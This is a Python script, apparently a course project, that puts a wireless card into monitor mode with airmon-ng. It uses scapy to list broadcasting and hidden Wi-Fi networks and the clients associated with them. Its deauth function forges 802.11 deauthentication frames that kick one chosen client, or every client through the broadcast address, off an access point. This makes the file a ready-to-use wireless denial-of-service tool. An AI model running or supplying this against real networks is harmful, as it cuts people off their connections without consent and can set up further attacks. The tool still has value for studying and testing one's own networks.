# CSC 842 Cycle 5 802.11 Scanner by Max Gorbachevsky
# This program turns on monitoring mode, scans for wireless access points and allows a choice to deathenticate clients.



from scapy.all import *
import sys
import subprocess

interface = 'wlan0mon'
hiddenNets = []
unhiddenNets = []
nets = {}
APSSID = ""
clients = []

# Scanning for broadcasting networks
def sniffOpen(p):
    if p.haslayer(Dot11Beacon):
        if p.getlayer(Dot11Beacon)[1].info:
            addr2 = p.getlayer(Dot11).addr2            
            netName = p.getlayer(Dot11Beacon)[1].info
            if netName.decode() not in nets.keys():
                print('[+] Detected SSID: ' + netName.decode() + ' with MAC:' + addr2)
                nets[netName.decode()] = addr2

# Scanning for hidden networks
def sniffDot11(p):
    if p.haslayer(Dot11ProbeResp):
        addr2 = p.getlayer(Dot11).addr2
        if (addr2 in hiddenNets) & (addr2 not in nets.keys()):
            netName = p.getlayer(Dot11ProbeResp).info
            print('[+] Identified Hidden SSID : ' + netName.decode() + ' for MAC: ' + addr2)
            nets[netName.decode()] = addr2
            hiddenNets.remove(addr2)
            
    
    if p.haslayer(Dot11Beacon):
        if p.getlayer(Dot11Beacon)[1].info == b'':
            addr2 = p.getlayer(Dot11).addr2
            if addr2 not in hiddenNets:
                print('[-] Detected Hidden SSID with MAC:' + addr2)
                hiddenNets.append(addr2)

# Management frames for connected clients
def sniffMgmt(p):
    stamgmtstypes = (0, 2, 4)
    if p.haslayer(Dot11):
        if p.type == 0 and p.subtype in stamgmtstypes:
            if p.addr2 not in clients:
                if p[0].info.decode() == APSSID:
                    print("Client:",p.addr2,"Associated with:",APSSID)
                    clients.append(p.addr2)

# Identifying clients connected to unhidden network
def getClients():
    global APSSID
    count = 1
    if not nets:    
        print("Must scan for networks first")
        return

    for key in nets.keys():
        print(count,"- SSID:",key," MAC:",nets[key])
        count += 1
    select = int(input("\nEnter number of SSID to scan for clients  >> "))
   
     
    print("\nScanning for clients associated with", select,"(control + c to stop)")
    count = 1
    for key in nets.keys():
        if count == select:
            APSSID = key
            break
        count += 1    
    print("Selection is: ",APSSID)

    try:
        sniff(iface=interface, prn=sniffMgmt)
    except KeyboardInterrupt:
        return 0

# Detecting hidden access points
def detectHidden():
    try:
        sniff(iface=interface, prn=sniffDot11)
    except OSError:
        print("Must set correct interface. Please refer to Main Menu option 6")
        return mainMenu()
    except KeyboardInterrupt:
        return 0

# Detecting broadcasting access points
def detectBroadcasting():
    print("Detecting networks")
    try:
        sniff(iface=interface, prn=sniffOpen)
    except OSError:
        print("Must set correct interface. Please refer to Main Menu option 6")
        return mainMenu()
    except KeyboardInterrupt:
        return 0

# Print data function
def output():
    print("Access points")
    for i in nets.keys():
        print("\tSSID:",i," MAC:",nets[i])
    
    print("\nClients associated with", APSSID)
    for client in clients:
        print("\t",client)

    print("\nHidden APs")
    for i in hiddenNets:
        print("\t",i)

# Deauthentication function
def deauth():
    
    try:
        bssid = nets[APSSID]
    except KeyError:
        print("First scan for clients")
        return
    print("0 Deauth all clients")
    for i in range(0,len(clients)):
        print(i+1,clients[i])
    select = int(input("Select client to deauth >> "))
    if select == 0:
        target = "FF:FF:FF:FF:FF:FF"
    else:
        target = clients[select-1]
        print("Target is:",target)
        print("BSSID is:", bssid)
    
    packet = RadioTap()/Dot11(type=0,subtype=12,addr1=target,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
    for i in range(0,5):
        sendp(packet)

# Function for setting the interface
def setInterface(interface,error=False):
    if error:
        print("")
    print("Interface setup")
    print("\t1 - Enable and set monitor mode")
    print("\t2 - Set interface (already enabled)")
    print("\tb - Back to the menu")   
 
    choice = getChoice()
    if choice == "1":
        stdoutdata = subprocess.getoutput("ifconfig | grep -i flags | cut -d' ' -f1 | cut -d':' -f1")
        ints = stdoutdata.split()
        
        while True:
            print("Found the following interfaces")
            for i in ints:
                print(i)
            interface = input("Select a wireless interface (most likely wlan0) >> ")
            if interface in ints:
                break
            else:
                continue
        print("Enabling monitor mode on",interface)
        stdoutdata = subprocess.getoutput("airmon-ng start " + interface + " | grep -E '[[:space:]][0-9]{3}[[:space:]]' | cut -d' ' -f3")
        processes = stdoutdata.split()
        print(processes)
        print("Killing the following processes as they may cause issues") 
        for process in processes:
            print(process)
            stdoutdata = subprocess.getoutput("kill " + process)
        
        stdoutdata = subprocess.getoutput("ifconfig | grep -i flags | cut -d' ' -f1 | cut -d':' -f1")
        ints = stdoutdata.split()
        print("Found the following ints")
        for i in ints:
            print(i)

        while True:
            interface = input("Select the interface in monitor mode (most likely wlan0mon) >> ")
            if interface in ints:
                break
            else:
                continue
        return interface

    if choice == "2":
        stdoutdata = subprocess.getoutput("ifconfig | grep -i flags | cut -d' ' -f1 | cut -d':' -f1")
        ints = stdoutdata.split()
        print("Found the following ints")
        for i in ints:
            print(i)
        while True:
            choice = input("Select an interface in monitor mode (most likely wlan0mon), or b to go back  >> ")
            if interface in ints:
                interface = choice
                return interface
            elif choice == "b":
                mainMenu()
            else:
                continue  


# Choice function for Main Menu
def getChoice():

    while True:
        try:
            choice = input("Enter selection  >> ")
            if choice in ["q","Q","quit","Quit","exit"]:
                quit()
            elif choice in ["b"]:
                return choice
            try:
                int(choice)    
            except ValueError:
                print("ERROR: must enter integer")
                continue
        except KeyboardInterrupt:
            quit()
        return choice



# Main Menu
def mainMenu():
    global interface
    print("")
    
    
    print("\n\t##############\n\t   Main Menu\n\t##############")
    print("\nInterface needs to be set as",interface)
    print("Target network:",APSSID)
    print("\t1 - Scan for broadcasting networks")
    print("\t2 - Scan for hidden networks")
    print("\t3 - Scan for associated clients")
    print("\t4 - Deauthenticate clients")
    print("\t5 - Print data")
    print("\t6 - Interface setup")
    print("\tq - quit")
    print("\n")

    choice = getChoice()
   
    if choice == "1":
        print("Scanning for broadcasting networks (control + c to stop)")
        detectBroadcasting()
    if choice == "2":
        print("Scanning for hidden networks (control + c to stop)")
        detectHidden()
    if choice == "3":
        getClients()
    if choice == "4":
        deauth()
    if choice == "5":
        output()
    if choice == "6":
        interface = setInterface(interface)
    

# Start
while True:
    mainMenu()
